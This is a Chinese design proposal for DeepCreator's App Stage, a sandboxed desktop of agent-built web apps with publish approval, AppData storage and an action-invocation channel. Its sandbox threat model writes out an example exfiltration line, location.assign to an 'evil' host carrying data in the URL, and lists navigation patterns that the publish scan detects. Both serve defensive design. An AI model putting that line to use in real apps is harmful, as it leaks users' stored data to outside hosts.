# App Stage 设计提案

Status: **提案 v0.0.6 — 未实现**。本文定义 DeepCreator 的 App Stage（应用舞台）：一个内嵌于中央舞台、由 Cordis 插件承载的"AI 操作系统"——AI 在 preset 会话中开发应用、打包上线到全局桌面，并把已安装应用当作自己的技能包；人类与 AI 共用同一批应用作为工作界面。版本沿革：v0.0.2 经三轮红蓝对抗评审（`output/app-stage-debate/90-verdicts.md`）；v0.0.3 增补 Presence 子系统（`docs/design/app-stage-presence.md`）；v0.0.4 完成工作方式修订（preset 隔离/全局桌面/打包上线/数据域分离，`output/app-stage-v4/93-v4-verdicts.md`）；v0.0.5 吸收五视角外部独立评审（设计盲区/实现/安全/用户/生态，32 项裁决见 `output/app-stage-critique/02-chair-verdicts.md`）：发布信任链加来源判定与富审批、AppData 升级单文档+事件日志、平台协议版本化、卸载进 Phase 1、砍隐藏 runner 与资源池体系、修正 workspace 发现源的机制事实（官方无 open/close 生命周期）；**v0.0.6 场景压测（无限画布生图应用）**：定案运行时资产目录（`app_asset_write/list`，关闭开放问题 16）、agentGuide 应用自带技能、对话坞与"对话｜应用"分段入口（用户拍板）。工具/技能完整规格见 `docs/design/app-stage-agent-surface.md`（v1.0），UI 方案见 `docs/design/app-stage-ui.md`（v1.0），过程裁决记录见 `output/app-stage-*/`（各目录留存的 verdicts 文件）。各阶段实现时同步更新 `docs/architecture/deepcreator.md` 与所属包 README（英文），本文随之收敛为对已实现行为的引用。

命名说明：舞台/特性名暂定 **App Stage**，与既有 **Workbench**（会话右侧工具面板系统）区分并存；agent preset 暂名 **app-stage**；技能名沿用提出者词汇 **workstage use** 与 **app-dev**。下文出现的包名、行 id、Slot 名、目录约定均为暂定，实现时以 `deepcreator-web` patch 与 one-owner 规则为准。

## 已确认的决策

1. **舞台形态：中央舞台接管。** App Stage 与对话 Stage 平级切换：Sidebar 提供切换入口，进入后 App Stage 接管整个中央区域（含 Workbench 位置），对话与 Workbench 子树保持挂载、可随时切回。不做 Workbench 内嵌面板，不做覆盖 Sidebar 的全窗口桌面。**对话坞（用户拍板）**：apps 模式下，App Stage 右上角按钮可将对话区打开为舞台右侧边栏——对话与应用同屏是原生形态：边聊边看、发布审批在坞内直接确认、presence 信号与对话反馈并置；同屏不再等 Px-β 跟随视图。
2. **应用形态与定位：静态 Web 应用 + 沙箱为基线，定位是"AI 可完全掌控、完全自行自动操作的 AI 操作系统"。** 应用契约从第一天起机器可操作：manifest 预留 actions 声明，技能晚于契约落地。应用开发与操控能力经单一 shipped preset（暂名 `app-stage`）提供：工具面属 preset 专属插件行，技能文件随 preset；已安装应用作为 agent 的技能包（apps-as-skill-pack）随取随用。**应用是 agent 的输出面**：用户不必自己填数据，agent 负责把工作产出写进应用（`app_data_write` / invoke）——此叙事写进空态引导与 app-dev 技能。
3. **能力边界（应用→DeepCreator 方向）：第一期应用零 DeepCreator 能力。** 应用纯展示 + 自持数据；应用反向调用 DeepCreator（读工作区、触发 agent 等）属于受控能力桥，留待 Phase 3 权限模型激活（`permissions` 字段保留）。AppData 与其 `data.get/set` 桥是 DeepCreator 向应用提供的自持数据机制，不属反向能力。**零泄漏原则**：未挂该 preset 的会话不感知 App Stage（见"控制面·零泄漏原则"）。
4. **全局桌面与打包上线。** App Stage 是跟着人走的唯一桌面：工作区只是应用的出生地（源码所在地），上架须经 `app_publish` 打包安装进用户级存储；Launcher 只呈现已安装应用，切换工作区/会话界面不变。首次发布走对话内审批（确认一次），**同来源**版本更新免确认、来源漂移（不同工作区）轻确认（v0.0.5 来源判定）；dev（源码）与 installed（安装副本）数据域永不分串；dev 应用不可被当作技能包调用。
5. **AI 操作全程可见**（用户拍板）：Presence 子系统承载（另文）；本文件承载的对应推论：invoke 不做不可见自动化——无隐藏 runner（见"控制面"），conversation 模式下后台活动有可见性出口（活动 chip）。

## 定位与概念模型

> App Stage 是内嵌在 DeepCreator 中央舞台的"AI 操作系统"：AI 在 preset 会话中开发应用、打包上线到全局桌面，并可通过技能自主操控这些应用；人类和 AI 共用同一批应用作为工作界面。

操作系统隐喻与本体对应：

| OS 隐喻 | 本体 | 说明 |
|---|---|---|
| 显示器/桌面 | Stage Shell + Launcher | 中央舞台接管层 + 全局已安装应用图标墙 |
| 应用程序 | App = manifest + 前端入口 | manifest 含元数据与 actions 声明；入口为静态 Web 资源 |
| 内核服务 | AppRegistry / AppRuntime / AppData / AppControl | 全局发现、沙箱运行、双域状态、命令通道（常驻） |
| 系统调用层 | app-stage preset（工具 + 技能） | agent 侧窄工具组（app_*）+ app-dev / workstage use 技能 |
| 软件生产线 | 会话即开发环境 | AI 在会话写代码 → 落 workspace 约定目录 → 过闸 → `app_publish` 打包上线 → 全局桌面 |

闭环与所有权边界（架构图必须保持官方 Runtime / DeepCreator 插件边界）：

```
┌─ 官方 Harness Runtime ──────────────────────────────────────┐
│ 会话执行 · 文件工具写入 · 事件日志 · Browser 语义工具 · preset 体系 │
└────┬──────────────────────────────▲─────────────────────────┘
     │ AI 开发：写入工作区应用目录    │ app-stage preset（工具/技能）
     ▼                              │
┌─ DeepCreator 插件 ────────────────┴─────────────────────────┐
│ workspace 应用目录 → AppRegistry 过闸 → 开发中菜单            │
│ app_publish 快照安装（首发审批）→ 用户级存储 → 全局 Launcher   │
│ AppRuntime 沙箱渲染 ← 用户点图标 / app_invoke 按需就绪        │
│ AppControl 命令通道 ⇄ 应用 actions；AppData 双域状态         │
└──────────────────────────────────────────────────────────────┘
```

普通会话零感知：工具与技能仅随 preset 进入会话（零泄漏原则）。应用间无互操作协议：**agent 是唯一组合层**（跨应用编排经 agent 的会话推理完成，Phase 3 前不引入应用间协议）。

## 目标

- AI 开发闭环：模型在 preset 会话中写出应用、过闸、`app_publish` 打包上线（首发经用户一次确认），应用进入全局桌面，任意工作区可打开使用。
- 人机共用界面：用户在应用里操作，agent 通过声明 action 可靠驱动同一应用；已安装应用同时是 agent 的技能包；agent 后台驱动时用户始终有可见性出口（轮流使用 ≠ 共用界面的反面）。
- 契约先行：`actions` 字段自 v0.0.1 起存在于 manifest（源码态填写可选）；发布态双通道准入（随 Phase 2 完整生效）——已安装应用在 Phase 2 激活 invoke 时无需迁移 manifest。
- **热上架（显式不变量）**：应用的发现、发布、安装、卸载全部是**运行时数据路径**——DeepCreator 不需要重新构建、不需要重启、不需要页面刷新；Launcher 与开发中菜单经 Registry 订阅实时更新，per-app 静态 origin 经 `ensureReady` 懒创建。应用是数据（workspace 文件 + 安装快照），不是被编译进 DeepCreator 的代码；需要重建/重启的只有 App Stage 功能本身（"操作系统"的迭代），且插件升级不动用户级存储中的安装副本。
- 全部构件可插拔：Client feature 包 + 常驻 Host 包（deepcreator-web bundle 行）+ agent 能力 Host 包（随 app-stage preset 行，不经 bundle）+ preset 目录（技能资产），可插入、禁用、销毁，符合仓库组合规矩。

## 非目标（各阶段边界）

- 应用反向调用 DeepCreator 能力（受控能力桥属 Phase 3）。
- 应用导入：导入是安装机制的第二入口（同一包格式与安装链路，Phase 3）；导出、回退（Phase 3 生命周期；卸载与隐藏已进 Phase 1）。
- DeepCreator 自有渲染器之外的声明式看板配置（架构预留扩展位，不在本期）。
- "项目管理中台"的项目绑定语义：Launcher 已是全局纯桌面，项目概念无从挂靠；等真实用法长出来再定。
- **跨设备数据同步**：AppData 与安装清单为单机本地存储（与 DeepCreator 其余本地状态一致）；多设备同步属产品层整体课题，App Stage 不单独解决（开放问题 15 声明边界）。

## 舞台机制（Stage Shell）

现状核对：`ui-layout` 的三列网格为 Sidebar | Conversation | Details，"Stage" 的既有语义是中央区域（Conversation + Workbench，不含 Sidebar）；对话区是 Stage 常驻主体，产品当前只有一个 Stage。

提案在其上扩展"舞台模式"，不重写布局：

- `ILayout` 增加 `setStageMode('conversation' | 'apps')`；布局 store（transient）持有当前模式。
- ui-layout 声明新的子 Slot `deepcreator.stage.apps`（暂定名），该席位的 occupant **常驻挂载、默认隐藏**——与 details 列"宽度归零仍保持挂载"的既有不变量一致。此挂载模型同时是 invoke 的执行地基：apps 模式之外容器 iframe 物理存活，agent 可驱动（见"控制面"）。
- `apps` 模式下，App Stage 层以与 Workbench Focus 相同的几何覆盖 Stage（`inset: 0 0 0 var(--dsh-stage-left)` 先例）；进入 `apps` 模式自动退出 details Focus（互斥规则）。
- 进入 `apps` 模式压入一条带标记的浏览器历史记录（手机 Workbench `pushState` 先例，state 携带模式标记）；退出对账覆盖全部路径：返回手势（popstate）退出时消费该条目；Sidebar 开关或其他代码路径退出时，若栈顶为本模式标记条目则主动 `history.back()` 消费；插件卸载/模式表面消失同样对账。切换 active session 或工作区不退出模式、不触发对账（全局桌面，见"作用域与归属"）。
- 切换入口（用户拍板 v0.0.5）：**Sidebar 分段按钮"对话｜应用"**，位于"新会话"行上方（primary 列表之前）——形态先例=对话区"对话｜轨迹"视图切换（`conversation.view` Slot 多视图互斥单显）。选中段=当前舞台模式（conversation|apps），点"应用"进 apps/再点回对话；分段按钮承载**活动指示点**（agent 后台驱动应用时"应用"段亮点）。原 `sidebar.primary.action` 席位方案废弃（分段按钮是 Shell 级 chrome，非 feature action 行）。实现注记：分段按钮由 ui-sidebar Shell 持有或 App Stage 注入 Sidebar 顶部 Slot（实现期定）；`setStageMode` 布局 store 不变。
- **对话坞（用户拍板，v0.0.5 澄清）**：apps 模式下，右上按钮簇的"对话"开关将**现有对话区原样停靠**为舞台右侧边栏——是**完整对话区功能的停靠**，不是新面板容器：消息流/输入/确认卡/Workbench 面板行为全部原样保留（Workbench 面板点击打开后**铺满对话坞区域**，打开下一个面板时上一个隐藏，同一时刻只出现一块面板——`ui-layout` 现有 Stage 语义不变，仅几何从"中央舞台"换为"右侧停靠"）。apps 区域收窄重排；关闭即收起；退出 apps 模式自动还原常驻对话舞台（开合状态 root-scope transient）。审批等待且坞关闭时：开关呼吸提示 + presence 横幅承载，不强制自动打开。手机（≤640px）对话坞为覆盖式抽屉。
- 手机宽度（≤640px）：App Stage 以全 Stage 覆盖投影（`mobileDetailsOpen` 先例），响应式细则实现期定。
- 模式持久化暂为 root 级 transient；是否按 Session 持久列为开放问题 2。

## 应用契约（manifest v1）

应用是 workspace 内一个自包含目录，`app.json` 为契约：

```jsonc
{
  "id": "kanban",                // kebab-case，工作区内唯一
  "platform": "app-stage-v1",    // 必填：平台协议版本（v0.0.5）
  "name": "任务看板",
  "version": "0.1.0",
  "description": "给 agent 和人共用的任务看板",  // 启动器与 agent 共用
  "icon": "icon.svg",            // 可选，目录内相对路径
  "entry": "index.html",         // 默认 index.html
  "dev": false,                  // 可选：开发态标记（见"发现与生产线"）
  "agentGuide": "AGENT.md",      // 可选：agent 操作指南（包内相对路径；v0.0.6）
  "dataVersion": "1",            // 可选：AppData 数据模式版本（v0.0.5）
  "actions": [                   // 可选；契约先行，Phase 2 激活调用
    { "name": "createTask", "description": "在指定列新建卡片，title 为卡片标题文本",
      "persist": ["board"],      // 可选：声明写入的 AppData 键路径（v0.0.5）
      "params": { "title": "string", "column": "string?" } }
  ],
  "permissions": []              // 保留字段，恒为空
}
```

- params 采用宽松标量类型（`string | number | boolean | json`，`?` 表可选）；完整 JSON Schema 化 deferred。
- **平台协议版本**（v0.0.5）：`platform` 必填，当前唯一合法值 `app-stage-v1`；桥握手携带双方支持范围。DeepCreator 自身迭代导致协议失配时，已安装应用转可诊断状态（"应用协议不匹配当前平台版本"，见损坏条目路径）——不是静默空白。manifest 版本属应用自身，`platform` 属平台契约，两者分离。
- actions 的运行时协议（postMessage 注册 handler、Host 中继 `invoke`）在 Phase 2 实现；本版只落契约字段与校验。
- **actions `description` 写作标准**（给模型看的工具说明，app-dev 技能互引）：三要素——何时用（触发场景）/ 做什么（一句话）/ 每参数含义（含单位与取值）；禁空话："创建任务"✗ → "在指定列新建卡片，title 为卡片标题文本"✓；每条 ≤120 字符。
- **`persist` 声明**（v0.0.5）：可选，声明该 action 写入的 AppData 键路径（≤8 条）；Phase 2 开发期告警（"声明持久效果但 AppData 无变更"）的实现依据。
- **`agentGuide` 应用自带技能（v0.0.6）**：可选字段，声明包内一份面向 agent 的操作指南（默认名 `AGENT.md`，≤32 KiB）——**应用开发的过程同时开发 agent 使用该应用的技能**：何时用这个应用 / 操作工作流序列 / 组合范式（如画布的"生成→放置→摆位"）/ 注意事项。声明则文件必须存在（完整性闸，同 icon 规则）；内容经 `app_manifest` 内联返回（已安装应用文件不在 agent 文件面内）。**不注册进技能根**：技能列表随应用数膨胀进 system prompt；按需读指南是主动获取、零上下文成本、卸载即消失。app-dev 技能要求发布时必写指南（操作者视角工作流的成文形态）。指南中的代码是**参考范例不是执行体**——应用操作唯一通道是 invoke；批量操作 = action 接受 json 数组 + 会话内循环（护栏既有）。
- manifest 展示字段（name/description/icon）按不可信内容处理：纯文本渲染，图标按受控资源加载。
- 校验细则（随 Phase 1 实现）：`id` kebab-case 且与目录名一致；`platform` 必填且值合法；`entry`/`icon` 为目录内相对路径，拒绝绝对路径与 `..` 段；`actions[].name` camelCase 且应用内唯一、数量 ≤32；params 键 ≤16、类型限四类；`persist` 键路径 ≤8 且为合法路径段；manifest 整体 ≤64 KiB；icon 限 `.svg`/`.png` 且 ≤256 KiB，一律以 `<img>` 加载（SVG 经 img 不执行脚本）。
- **发布态双通道准入**：每个已发布应用至少具备一条 agent 可驱动通道——声明并实现 ≥1 个 action（handler 注册验证），**或**订阅 ≥1 个 AppData key（桥级订阅事实机器可验证）。理由：数据看板类应用无 UI 动作但完全可驱动，强制 ≥1 action 会逼出假 action 污染契约。**分阶段生效**：Phase 1 发布闸验证通道二（订阅事实不依赖 invoke 协议）+ 零外联扫描；Phase 2 补通道一（handler 注册验证，不做合成参数真调——校验严格的 action 会正确拒绝合成垃圾参数，真调探针制造假阴性逼出装饰性适配，真调验证归 app-dev 内环自测与审批卡截图）。存量过渡：Phase 1 已安装应用在 Phase 2 上线后，于下次版本更新时补全通道一验证。

## 发现与生产线

- **目录约定**：源码根 `<workspace>/.deepcreator/apps/<app-id>/`（终名两案并列见开放问题 1）。三层结构已确认保留，**决定性理由=枚举 id 与项目内容的冲突隔离**——应用目录名是任意枚举的 id（kanban/notes/...），与项目自身内容共享命名空间必然撞名，故需保留地；固定名子系统目录（.agents/、output/）不会撞名，不构成论据。`apps/` 子层=保留地内类别名，非必需层。
- **全局 AppRegistry 管理两类发现源**（v0.0.5 修正机制事实）：① 用户级安装存储（已安装副本）；② **全部 workspace 记录**——官方 Workspace 系统是持久 KV 记录（`workspaces` 为 client 服务：rename/delete/startSession 等），**没有"打开/关闭"生命周期**；枚举与 Sidebar Workspace 浏览器同一事实源（记录全集）。**watcher 集 = 有活跃 session 绑定的工作区**（Host 侧从 session 生命周期派生——session 创建/结束是真实事件源，`session.header.cwd` 为绑定依据）：会话绑定出现 → 注册该根 recursive watcher（review watcher 先例；**递归 watcher 不可用平台回退为定时扫描 + 打开时实证**，review 先例自带该回退）；绑定全部结束 → 撤 watcher、该工作区 dev 条目转"无监听"标注（保留最后通过闸的快照，打开时实证；再次绑定时刷新）；从未有会话的记录 = 启动扫描一次 + 首次绑定时刷新。工作区路径不可达（目录被移走/删除）→ "路径不可达"标注。安装存储无常驻 watcher：完整性靠插件启动时全量校验 + `ensureReady` 打开时实证。
- **上架完整性闸（dev 门）**：发布条件的前半程——manifest 校验通过 **且** entry 文件与声明的 icon 实际存在、可被静态服务命中；过闸后进入**开发中菜单**（不上 Launcher）。过闸后资源缺失走"损坏条目"路径：保留条目并标注原因，恢复后自动解除；协议失配（platform 不被当前平台支持）同走此路径。非法 manifest 显式拒绝并给可行动错误，不做静默降级。
- **诊断协议（`app_list`）**：返回两类条目（preset 会话视角）——`installed` 段全局（裸 id，含版本/来源/originURL/actions 摘要/platform）；`dev` 段仅当前会话 workspace、**列出全部条目含被闸拒绝者**。status 四枚举：`ready` / `incomplete` / `rejected` / `broken`。异常态必带 `reason: {code, detail, fix}` 三段（code 机器枚举 `manifest.invalid` / `gate.incomplete` / `runtime.broken` / `platform.unsupported`；detail 英文含 JSON 路径定位；fix 一句话修复方向）——面向模型消费，英文。`originURL` 仅 ready 提供；诊断不去抖；dev 条目带 `conflictsWithInstalled` 提示。本工具仅挂 app-stage preset 会话。
- **热重载语义分叉**：dev 态文件变更 → **即时热重载** + 容器角标"开发中 v\<version\>"（去抖按消费者拆分：容器侧比对内容 digest、诊断侧逐事件——v0.0.5）；已安装应用版本更新 → 延迟到容器空闲或用户确认，重载发生时容器给一次可见的"已更新至 vX"提示（非静默换界面）。`dev: true` 缺省 false；发布快照物化时剥离。dev 版本高于 installed 当前版本（或同版本异 digest）→ 开发中菜单条目显示"可更新"角标。

## 发布与安装链路

**包格式**：应用包 = 工作区源码目录的内容快照，格式与导入（Phase 3 第二入口）统一。快照范围 = `.deepcreator/apps/<app-id>/` 全量拷贝，排除：隐藏文件与目录、`node_modules`、一切符号链接（记录目标路径但不跟随——Turn manifest 先例）。包内布局 `app.json` 居根；版本戳取快照时 manifest 的 `version`；包体 ≤20 MiB（超限 `PACKAGE_TOO_LARGE`）。snapshot digest 三用途不变：幂等短路 / 安装完整性基线 / 版本纪律。**原子性**：快照先聚合到临时目录再过闸（消除 TOCTOU）。

**`app_publish(appId)` 工具协议**：preset 专属 root-Agent 工具（工具可得性即权限）。源码定位 = 调用会话绑定的 workspace 下 `.deepcreator/apps/<appId>/`。前置条件：dev 条目 `status: ready`。**判定与来源判定（v0.0.5）**：id 已 installed ⇒ 版本更新流——安装记录携带 `sourceFingerprint`（首发工作区稳定标识），本次发布工作区**匹配 → 免确认**直接安装；**不匹配 → 轻确认**（确认卡标注"此更新来自不同工作区，原安装来自 \<工作区名\>"）——异源接管发布频道必须过人（防克隆/同事工作区内被注入的会话静默换掉用户桌面应用）。id 未 installed ⇒ 首发审批流：工具调用挂起等待用户 approve（挂起-应答按**新基础设施**估工与设计——"插件工具挂起"无已证实先例，不按复用估；实现期核官方是否有可复用挂起面，见开放问题 18）。**审批卡内容（v0.0.5 富化；截图通路 v0.0.6 定案）**：应用名/版本/来源工作区+会话/**首屏截图（发布闸 staging 机器截图——探针打开 staging origin 时以 browser-playwright 引擎生成，产物与被发布 digest 绑定；失败不阻塞发布，降级 icon+名称）**/actions 能力清单/**零外联扫描摘要**/"首次发布将安装到你的全局桌面"/**"可随时移除"明示**（审批的可逆性是确认的信任前提）。拒绝 → `USER_DECLINED`，不安装、不占 id。审批不持久化："确认一次"指成功安装。失败码十一枚举：`APP_NOT_FOUND` / `DEV_GATE_FAILED` / `MANIFEST_INVALID` / `PACKAGE_TOO_LARGE` / `ID_CONFLICT`（并发首发竞态；Phase 3 导入占用）/ `USER_DECLINED` / `VERSION_NOT_BUMPED` / **`VERSION_DOWNGRADED`**（v0.0.5：历史已有更高版本，拒绝降级——防回滚攻击）/ `SOURCE_MISSING` / `PROBE_FAILED`（附探针报告）/ `STORE_WRITE_FAILED`。

**发布闸（v0.0.5 重排）**：Phase 1 = manifest 校验 + staging 可服务性探测（临时静态 origin，GET entry/icon 200 且 MIME 正确）+ **静态零外联扫描**（扫描快照内绝对 URL 与导航 API 模式——`location.assign`/`location.href` 赋值/`window.open` 等——结果进发布报告与审批卡；安全论证不依赖 agent 截图自证）+ **通道二订阅验证**（staging 实例经桥订阅 ≥1 AppData key 即成立；验证源是 Host 侧订阅表，不依赖 invoke）。Phase 2 = +通道一 handler 注册验证（加载 staging 实例，验证 manifest 声明的每个 action handler 已注册，不真调）。探针跑 staging 临时域，结束销毁。

**安装态与用户级存储布局**：STORE_ROOT 锚点 `$DSH_HOME/deepcreator/`。目录结构：`<STORE_ROOT>/apps/installed/<appId>/<version>/`（版本目录，快照展开，只读）；`current.json` 指针 {appId, version, digest, installedAt, sourceWorkspace, sourceFingerprint, sourceSession, publishedVia}；`history.jsonl`（保留 50 条）。**文件系统是唯一事实源**（v0.0.5 砍索引双写：Phase 1–2 规模下直接读 `current.json`，微秒级；Phase 3 搜索真需要时再加索引投影）。发布新版本 = 新版本目录 + 指针切换，旧版保留。用户手改安装目录 → `ensureReady` 实证 digest 失配 → 损坏条目路径。**安装是运行时事务**（热上架不变量）。**卸载与隐藏（v0.0.5，Phase 1）**：条目详情 → 卸载（确认对话明示将删除应用与其 AppData installed 域数据，dev 源码不受影响；删版本目录+指针+AppData 域）/"从桌面隐藏"开关（不删任何数据）。**出厂预装（v0.0.5）**：reference 应用精简版随常驻插件首启预装进 installed 域（`publishedVia: 'builtin'`，标注"示例应用"，可卸载）——空桌面问题消失，用户 30 秒看到桌面长什么样。

**id 冲突与寻址消歧**：用户级 id 全局唯一。不同工作区 dev 同名 appId 天然共存（菜单按工作区分组）；installed 与 dev 同名并存是正常态（菜单条目对比标注）。**寻址规则**：裸 `appId` 恒指 installed；dev 唯一入口 = 开发中菜单预览与 resolver `scope:'dev'`，工具面记法 `dev:<workspaceId>:<appId>`。

## 作用域与归属

- **壳状态 root 级**：Stage mode 与席位是 root-scope transient；App Stage 是**跟着人走的唯一桌面**：Launcher 与已打开容器的呈现不随 session/workspace 切换变化。
- **全局内容服务**：AppRegistry / AppRuntime / AppData / 静态 origin 服务是**用户级全局单例**，归常驻 Host 插件所有，生命周期 = 常驻插件生命周期。工作区只是应用的"出生地"。
- **双类发现源与 watcher 集**：见"发现与生产线"（v0.0.5 修正：记录全集枚举 + 活跃会话绑定 watcher）。
- **AppData 双域**：`installed` 域 = 全局 appId；`dev` 域 = workspace+appId；域间永不可见；**发布不迁移数据**（dev 试验数据永不污染正式数据；发布时可选数据迁移 = 开放问题 17）。寻址对应用透明：桥层按 **origin 定域**。agent 数据工具只寻址已安装版。
- **会话/工作区切换**：不关闭任何已打开容器、Launcher 聚合不变。installed 容器与源工作区生死解耦；dev 预览容器依赖源工作区路径可达：不可达时显示可行动错误并按预览"关闭即逝"语义退出。

## 运行与沙箱边界

应用代码不可信。边界声明分两类：**复用已验证先例**——loopback-only origin（限制**同机可达性，非 ACL**——多用户 OS 下同机进程可扫端口，如实声明强度）、路径/symlink/扩展名围栏、零 Node 能力；**无先例的新能力面**——`allow-scripts` 嵌入（仓库唯一 iframe sandbox 先例是 `sandbox=""` 无脚本渲染）。针对脚本执行的威胁建模：

- 属性集白名单：仅 `allow-scripts`；不给 same-origin、top-navigation、forms、popups。
- CSP 响应头：`default-src 'self'; form-action 'none'; frame-ancestors <承载 shell 的 origin>`。
- **自导航 = 数据外泄通道（v0.0.5 重分类）**：CSP 封子资源加载但不封自导航（`navigate-to` 已废弃）；`location.assign('https://evil/?d=…')` 可把已灌入 AppData 的数据（agent 合法写入的敏感内容）经 URL 一次性外带（256 KiB 量级）。此面与 presence 视口防伪并列为开放问题 3 的**两个硬性取舍条件**（防伪 + 防泄）——任一成立则 Desktop 必须走 IAB（进程隔离掐断跨 origin 导航）。Web 模式如实声明残余风险；app-dev 技能纪律：AppData 值不得拼进 URL/跳转。
- 资源滥用：返回 Launcher 即卸载应用 iframe；重进重新加载，状态在 AppData 不受影响。

嵌入与 origin 策略：

- **隔离 origin**：复用 Artifact HTML preview 静态服务机制与围栏。**双供源根**：installed 副本与工作区 dev 源码；`ensureReady` 记录供源目录类型（AppData 域定域依据）。
- **最小权限嵌入**：sandboxed iframe；Desktop 可升级 IAB Surface。**双嵌入面分层承诺（v0.0.5）**：桥协议层两形态完全共享，只换嵌入层——origin/桥/presence 描述统一，不 fork 引擎。
- **资源策略（v0.0.5 大幅简化）**：origin 生命周期属全局 AppRuntime（常驻插件生命周期）。统一就绪入口 `ensureReady(appId | dev:workspaceId:appId) → URL` 懒创建。**停止 = 引用计数归零**：该应用无 Stage 容器引用即停 origin（席位常驻挂载，容器 iframe 物理存活期间 origin 存活；**无隐藏 runner**）。进程级内存护栏：全局并存 origin 宽松计数上限（实现期常数，量级 64）——仅防御泄漏 bug，正常使用不可达；到达即记日志关最旧，不产生用户可见错误路径。不设 TTL/LRU/驱逐体系：静态 loopback server 创建毫秒级、空闲占用近零（`listen(0)` 先例），第一批真实负载 = 可见容器 + 秒级瞬态。
- **唯一通信通道**：受控 postMessage 桥 → Host AppControl；Phase 1 落地最小数据子集 `data.get/set/subscribe`（subscribe 为通道二验证与多实例广播所需）。

## 控制面：AI 操控（核心差异化）

工具面（全部属 preset 行 `@ryanyujazz/dsh-app-stage-agent`，暂定）：

| 工具 | 行归属 | Phase |
|---|---|---|
| `app_list`（诊断协议，dev+installed） | preset | 1 |
| `app_publish`（含零外联扫描+订阅验证；handler 注册验证随 2） | preset | 1/2 |
| `app_invoke` / `app_open` / `app_data_read` / `app_data_write`（**只寻址已安装版**） | preset | 2 |
| `app_asset_write` / `app_asset_list`（运行时资产通道，**只寻址已安装版**） | preset | 2 |
| `app_takeover`（Presence 联动） | preset | Px-β |

常驻行零 root-Agent 工具。

1. **结构化命令通道（主路）**：manifest 声明 actions → 应用注册 handler → Host AppControl 中继 `app.invoke(appId, action, params)`，参数按声明校验、可审计；**返回携带 {appId, version}**（v0.0.5：agent 感知 skill-pack 版本漂移，workstage-use 技能写明"行为异常先查版本"）。人和 agent 走同一通道。
2. **invoke 路由（v0.0.5 重设计）**：**只路由到 Stage 容器，无隐藏 runner**。无可见容器时经 resolver 打开 Stage 容器再执行（席位常驻挂载，容器 iframe 物理存活即可执行——不需要用户正处于 apps 模式）。**conversation 模式下的可见性**：agent 驱动应用时 Sidebar App Stage 开关亮活动点 + conversation 侧活动 chip（"AI 正在操作 \<app\>"，点击切换 apps 模式）；apps 模式下的同屏由**对话坞**承载——两向覆盖，"共用界面"不退化为"轮流且不知情"。无任何容器可挂载（headless 场景）→ 可行动错误（"应用需在 Stage 容器中运行"）；无人值守自动化留 Phase 3。持久效果必须写入 AppData；所有实例订阅变更自行重渲染——AppData 是唯一事实源，DOM 只是投影。开发期校验（依据 `persist` 声明）：声明持久效果但 AppData 无变更时告警。
3. **语义 DOM 自动化（兜底）**：应用即 loopback Web surface，现有 BrowserRuntime 语义工具可直接驱动（agent 自开实例）；可靠操控以 actions 通道为准。**子代理继承（D6）**：subagent 经 composeFrom 继承父 composition ⇒ 同样持有 `app_*` 工具（授权域不因父子变化）；跨子代理并发写同一应用无事务，编排责任在父代理。

**零泄漏原则**：未挂 app-stage preset 的会话不感知 App Stage——无工具、无技能、无 prompt section；被问及 App Stage 话题时以通识正常回应。普通会话被要求"往 `.deepcreator/apps/` 写个应用"时：① 正常写入（无 app-dev 技能指导）；② Registry 照常发现（watch 不区分写入者）；③ 闸照常把关；④ 来源如实标注；⑤ **只进开发中菜单，永不进 Launcher**——进入桌面必须经 `app_publish`，该工具仅存在于 preset 会话：普通会话物理上无法把任何东西装上用户桌面。

**呈现 resolver `app` 资源类型**（常驻行注册）：输入双形态——installed（`{kind:'app', appId}`：切 apps 模式 + `ensureReady` + 打开 Stage 容器）与 dev 预览（`{kind:'app', appId, scope:'dev', workspace}`：临时容器、不进 Launcher、关闭即逝、数据域 dev；校验该 workspace 记录存在且路径可达）。**普通会话首次 dev 预览 = 轻确认**（"此应用未经发布闸，确认预览？"——存在性校验≠授权，v0.0.5；preset 会话自测免确认）。边界判词：**呈现 ≠ 能力**——resolver 只打开已存在内容，无 `app_*` 工具语义。

**运行时资产目录（v0.0.6 场景压测定案，原开放问题 16）**：agent 生成的二进制资产（图/视频）经 preset 工具 `app_asset_write` 从 workspace 文件复制进该应用的**运行时资产目录**（用户级存储内、与版本快照分离、随卸载删除）；per-app 静态 origin 同源供给（CSP self 不破，路径围栏同款）；AppData 存引用（相对路径）不存字节；MIME 白名单（png/jpg/webp/gif/mp4/webm）+ per-app 容量上限（实现期常数）；配套 `app_asset_list` 枚举。**不违反零能力拍板**：应用只能读自己的资产（被动存储），无任何 DeepCreator 能力；写入方是 agent（preset 工具，审计面完整）。生成类组合模式（app-dev/workstage-use 技能互授）：**会话内生成（create_image 等）→ 资产通道 → invoke 放置**——应用自身永不生成，大产出永不进 AppData。

## 状态归属（AppData）

**AppData = 每 app 一个逻辑文档（对象树）+ 键路径级读写（v0.0.5 形状升级）**：应用经桥 `data.get(path?)` / `data.set(path, value)`（路径级写，不做全量 blob 重写——第一批真实应用是看板/追踪类结构化数据，全量重写每次写逼近上限且并发即丢更新）；`data.set` 生效即向所有实例广播**键路径级**变更事件。**Host 侧 append-only journal**（每 app，`history.jsonl` 同款机制）：每次 set 追加 {path, value, causeId, ts}——undo/导出/恢复/Phase 3 回退由日志重放免费获得（应用一个 bug 不再等于"AI OS 吃了我的看板"）；journal 保留上限与压实策略实现期定。上限：单值 ≤256 KiB、per-app 文档 ≤4 MiB（显式常数可调；二进制资产走"运行时资产目录"，见上节）。`dataVersion` 随文档携带（Phase 3 迁移地基，Phase 1 仅记录）。scope 双域不变（installed=全局 appId / dev=workspace+appId）。agent 工具面 `app_data_read/write` 属 Phase 2 且只寻址已安装版。应用状态不允许埋在 iframe localStorage（opaque origin 下本就抛错）。

## 包边界与组合

- **Client** `packages/client/ui-app-stage`（暂定）：Stage Shell、全局 Launcher 与开发中菜单、应用容器与桥、Presence 壳层、conversation 侧活动 chip、locale 命名空间 `app-stage`。
- **常驻 Host** `packages/host/app-stage`（暂定）：全局 AppRegistry（记录全集枚举+会话绑定 watcher/完整性闸/诊断）、AppRuntime（ensureReady/引用计数/内存护栏）、双供源根静态服务与 CSP、AppData 双域存储+journal、AppControl Remotes、PresenceCoordinator、呈现 resolver、出厂预装。
- **agent 能力 Host** `packages/host/app-stage-agent`（暂定）：无状态门面——`app_*` 工具注册 + prompt section；不经 bundle 行安装（dev 经 migrator link；生产以 bundle 依赖闭包携带，依赖≠行）。
